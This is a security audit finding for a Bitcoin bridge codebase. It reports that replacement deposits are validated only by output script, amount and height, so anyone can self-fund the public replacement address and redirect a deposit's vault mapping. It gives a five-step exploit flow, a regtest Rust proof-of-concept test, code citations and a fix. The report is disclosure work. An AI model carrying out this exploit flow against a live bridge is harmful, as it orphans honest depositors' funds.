### Title
ReplacementDeposit can be self-funded to an arbitrary outpoint without spending the security council's authorized old vault, permanently orphaning an honest deposit's move-to-vault UTXO - (File: core/src/verifier.rs, core/src/deposit.rs)

### Summary
`Verifier::is_deposit_valid` and `DepositData::get_deposit_scripts` only check that the declared `deposit_outpoint` on-chain output has the correct `script_pubkey` (derived deterministically from `nofn_xonly_pk` + `old_move_txid` + `security_council`) and correct `bridge_amount`/block height. Because this taproot address depends only on public data, any unprivileged party can fund it directly (as `scripts/replacement_test.py`'s `send_deposit(replacement_address)` demonstrates) without ever spending the real old move-to-vault UTXO via the security council multisig, and get verifiers to presign a second N-of-N move-to-vault entitlement citing a real `old_move_txid`.

### Finding Description
The broken binding: `ReplacementDeposit{old_move_txid}`'s presigned move-to-vault txid == a deposit that supersedes `old_move_txid` **because its funding UTXO was produced by the security council/N-of-N spending `old_move_txid`'s vault output** (`Multisig::from_security_council` in `create_replacement_deposit_txhandler`, [1](#0-0) ). In practice, the code that decides whether a deposit is acceptable, `Verifier::is_deposit_valid`, never checks provenance of the outpoint's funding transaction — only its script/value/height: [2](#0-1) 

The expected script for a `ReplacementDeposit` is built purely from public inputs (`nofn_xonly_pk`, `security_council`, and the attacker-supplied `old_move_txid`): [3](#0-2) [4](#0-3) 

Since this address is fully deterministic and public, anyone can pay `bridge_amount` BTC into it from their own funds — exactly as the repo's own `scripts/replacement_test.py` helper does (`send_deposit(replacement_address)`, not a spend of the old vault): [5](#0-4) 

Exploit flow:
1. Attacker learns `old_move_txid` (public on-chain data) of a real, already-vaulted `BaseDeposit`.
2. Attacker computes the replacement address via `generate_replacement_deposit_address(old_move_txid, nofn_xonly_pk, network, security_council)` (exposed by `GetReplacementDepositAddress` RPC) and funds it themselves, creating outpoint O'.
3. Attacker calls `Aggregator::new_deposit(DepositParams{outpoint: O', deposit_type: ReplacementDeposit{old_move_txid}})`.
4. `Verifier::is_deposit_valid` checks only script/value/height of O' — passes — and verifiers presign a new move-to-vault tx for O'.
5. When this is registered on Citrea via `replaceDeposit`, the deposit_id's move_txid pointer is switched from `old_move_txid` to the attacker's new move txid (per the test helper's own comment: "the move_txid for the corresponding deposit_id will be updated to replacement_move_txid"): [6](#0-5) 

Because nothing in `core/src/deposit.rs`/`core/src/verifier.rs` requires that O' derive from an actual spend of `old_move_txid`'s vault via the council path, an attacker can front-run any honest depositor's replacement flow, redirecting the deposit_id's Citrea-side entitlement to an attacker-funded vault. The real old vault (holding the honest depositor's original BTC, locked under old-nofn+council keys) becomes orphaned from the deposit_id and can never be legitimately re-linked, since a genuine security-council-authorized replacement citing the same `old_move_txid` would no longer match the deposit_id's already-overwritten current pointer.

### Impact Explanation
This is Critical: it results in an honest depositor's move-to-vault UTXO being permanently orphaned/frozen from the bridge's accounting (deposit_id's pointer already moved to an attacker-controlled vault, and no legitimate re-replacement can restore the mapping), while the attacker's self-funded vault takes over the entitlement for that deposit_id. This is repeatable against any deposit whose `old_move_txid` becomes public (i.e., every deposit, since move-to-vault txids are on-chain), at the mere cost of the attacker's own `bridge_amount` BTC (which they fund into their own vault — not stolen, but used to hijack the deposit_id slot) plus fees.

### Likelihood Explanation
No special privileges are required. Attacker only needs: (1) knowledge of a real `old_move_txid` (public), (2) ability to send a standard Bitcoin transaction of `bridge_amount` to a deterministically computable Taproot address, and (3) ability to call the aggregator's public `new_deposit`/`send_move_to_vault_tx` gRPC endpoints. This is directly demonstrated as an intended, low-friction flow by the repo's own `scripts/replacement_test.py`.

### Recommendation
`Verifier::is_deposit_valid` (or an earlier check in `DepositData`/`get_deposit_scripts` for `ReplacementDeposit`) must verify that the transaction funding the new deposit outpoint actually spends `old_move_txid`'s vault output through the security-council (or nofn) script path — e.g., by requiring the deposit outpoint's funding transaction to have exactly one input equal to `OutPoint{txid: old_move_txid, vout: UtxoVout::DepositInMove}` and that input's witness satisfies the `Multisig::from_security_council` script path, not merely checking the resulting output's script/value.

### Proof of Concept
```rust
// cargo test -p clementine-core --features automation test_replacement_deposit_without_council_spend
#[tokio::test(flavor = "multi_thread")]
#[cfg(feature = "automation")]
async fn test_replacement_deposit_without_council_spend() {
    let mut config = create_test_config_with_thread_name().await;
    let WithProcessCleanup(_, ref rpc, _, _) = create_regtest_rpc(&mut config).await;
    let actors = create_actors::<MockCitreaClient>(&config).await;

    // 1. Honest BaseDeposit, moved to vault once.
    let (_deposit_info, old_move_txid, _blockhash, _) =
        run_single_deposit::<MockCitreaClient>(&mut config, rpc.clone(), None, &actors, None)
            .await.unwrap();

    let nofn_xonly_pk = actors.get_nofn_aggregated_xonly_pk().unwrap();

    // 2. Attacker computes the deterministic replacement address and self-funds it,
    //    WITHOUT spending old_move_txid's vault UTXO via the security council.
    let (replacement_address, _) = clementine_core::builder::address::generate_replacement_deposit_address(
        old_move_txid, nofn_xonly_pk, config.protocol_paramset().network, config.security_council.clone(),
    ).unwrap();
    let attacker_funding_txid = rpc.send_to_address(&replacement_address, config.protocol_paramset().bridge_amount).await.unwrap();
    rpc.mine_blocks(1).await.unwrap();

    // Assert: old vault UTXO is still unspent (never touched by council multisig).
    let old_vault_outpoint = OutPoint { txid: old_move_txid, vout: UtxoVout::DepositInMove.get_vout() };
    assert!(!rpc.is_utxo_spent(&old_vault_outpoint).await.unwrap());

    // 3. Attacker submits ReplacementDeposit citing the real old_move_txid.
    let deposit_outpoint = OutPoint { txid: attacker_funding_txid, vout: 0 };
    let deposit_info = DepositInfo {
        deposit_outpoint,
        deposit_type: DepositType::ReplacementDeposit(ReplacementDepositData { old_move_txid }),
    };
    let mut aggregator = actors.get_aggregator();
    aggregator.setup(Request::new(Empty {})).await.unwrap();
    let result = aggregator.new_deposit(deposit_info.clone().into()).await;

    // Binding check: verifiers should have REJECTED this because old_move_txid's vault
    // was never spent by the security council, but is_deposit_valid only checks
    // script_pubkey/value/height, so it is accepted.
    assert!(result.is_ok(), "is_deposit_valid incorrectly accepted a replacement deposit whose old vault was never retired by the security council");

    // 4. Two live entitlements now exist for one custody unit: old vault (unspent, orphaned)
    //    and the new attacker-funded vault (about to be presigned/moved).
}
```

### Citations

**File:** core/src/builder/transaction/mod.rs (L412-428)
```rust
    Ok(TxHandlerBuilder::new(TransactionType::ReplacementDeposit)
        .with_version(NON_STANDARD_V3)
        .add_input(
            NormalSignatureKind::NoSignature,
            SpendableTxIn::from_scripts(
                input_outpoint,
                paramset.bridge_amount,
                vec![
                    Arc::new(CheckSig::new(old_nofn_xonly_pk)),
                    Arc::new(Multisig::from_security_council(security_council.clone())),
                ],
                None,
                paramset.network,
            ),
            crate::builder::script::SpendPath::ScriptSpend(0),
            DEFAULT_SEQUENCE,
        )
```

**File:** core/src/verifier.rs (L659-705)
```rust
        // check if deposit script in deposit_outpoint is valid
        let deposit_scripts: Vec<ScriptBuf> = deposit_data
            .get_deposit_scripts(self.config.protocol_paramset())?
            .into_iter()
            .map(|s| s.to_script_buf())
            .collect();
        // what the deposit scriptpubkey is in the deposit_outpoint should be according to the deposit data
        let expected_scriptpubkey = create_taproot_address(
            &deposit_scripts,
            None,
            self.config.protocol_paramset().network,
        )
        .0
        .script_pubkey();
        let deposit_outpoint = deposit_data.get_deposit_outpoint();
        let deposit_txid = deposit_outpoint.txid;
        let deposit_tx = self
            .rpc
            .get_tx_of_txid(&deposit_txid)
            .await
            .wrap_err("Deposit tx could not be found on chain")?;
        let deposit_txout_in_chain = deposit_tx
            .output
            .get(deposit_outpoint.vout as usize)
            .ok_or(eyre::eyre!(
                "Deposit vout not found in tx {}, vout: {}",
                deposit_txid,
                deposit_outpoint.vout
            ))?;
        if deposit_txout_in_chain.value != self.config.protocol_paramset().bridge_amount {
            let reason = format!(
                "Deposit amount is not correct, expected {}, got {}",
                self.config.protocol_paramset().bridge_amount,
                deposit_txout_in_chain.value
            );
            tracing::error!("{reason}");
            return Err(BridgeError::InvalidDeposit(reason));
        }
        if deposit_txout_in_chain.script_pubkey != expected_scriptpubkey {
            let reason = format!(
                "Deposit script pubkey in deposit outpoint does not match the deposit data, expected {:?}, got {:?}",
                expected_scriptpubkey,
                deposit_txout_in_chain.script_pubkey
            );
            tracing::error!("{reason}");
            return Err(BridgeError::InvalidDeposit(reason));
        }
```

**File:** core/src/deposit.rs (L206-217)
```rust
            DepositType::ReplacementDeposit(replacement_deposit_data) => {
                let deposit_script: Arc<dyn SpendableScript> =
                    Arc::new(ReplacementDepositScript::new(
                        nofn_xonly_pk,
                        replacement_deposit_data.old_move_txid,
                    ));
                let security_council_script: Arc<dyn SpendableScript> = Arc::new(
                    Multisig::from_security_council(self.security_council.clone()),
                );

                Ok(vec![deposit_script, security_council_script])
            }
```

**File:** core/src/builder/address.rs (L89-103)
```rust
pub fn generate_replacement_deposit_address(
    old_move_txid: bitcoin::Txid,
    nofn_xonly_pk: XOnlyPublicKey,
    network: bitcoin::Network,
    security_council: SecurityCouncil,
) -> Result<(Address, TaprootSpendInfo), BridgeError> {
    let deposit_script =
        ReplacementDepositScript::new(nofn_xonly_pk, old_move_txid).to_script_buf();

    let security_council_script = Multisig::from_security_council(security_council).to_script_buf();

    let (addr, spend) =
        create_taproot_address(&[deposit_script, security_council_script], None, network);
    Ok((addr, spend))
}
```

**File:** scripts/replacement_test.py (L63-84)
```python
def get_replacement_address(move_txid):
    output = run_cmd(
        f"cargo run --bin clementine-cli -- --node-url {NODE_URL} aggregator get-replacement-deposit-address "
        f"--move-txid {move_txid}"
    )
    for word in output.split():
        if word.startswith("bcrt") or word.startswith("tb1") or word.startswith("bc1"):
            return word.strip()
    return None


def register_replacement_deposit(new_txid, new_vout, old_txid):
    final_output = run_cmd(
        f"cargo run --bin clementine-cli -- --node-url {NODE_URL} aggregator new-replacement-deposit "
        f"--deposit-outpoint-txid {new_txid} "
        f"--deposit-outpoint-vout {new_vout} "
        f"--old-move-txid {old_txid}"
    )

    run_cmd(f"{RPC} -generate 1")

    return final_output.split("Move txid: ")[1].strip()
```

**File:** core/src/test/common/citrea/mod.rs (L495-510)
```rust
/// After a replacement deposit is done, register this replacement on citrea
/// The move_txid for the corresponding deposit_id will be updated to replacement_move_txid
pub async fn register_replacement_deposit_to_citrea(
    e2e: &CitreaE2EData<'_>,
    replacement_move_txid: Txid,
    deposit_id: u32,
    actors: &TestActors<CitreaClient>,
) -> eyre::Result<()> {
    wait_until_lc_contract_updated(
        e2e.sequencer.client.http_client(),
        e2e,
        actors,
        Some(replacement_move_txid),
    )
    .await?;

```
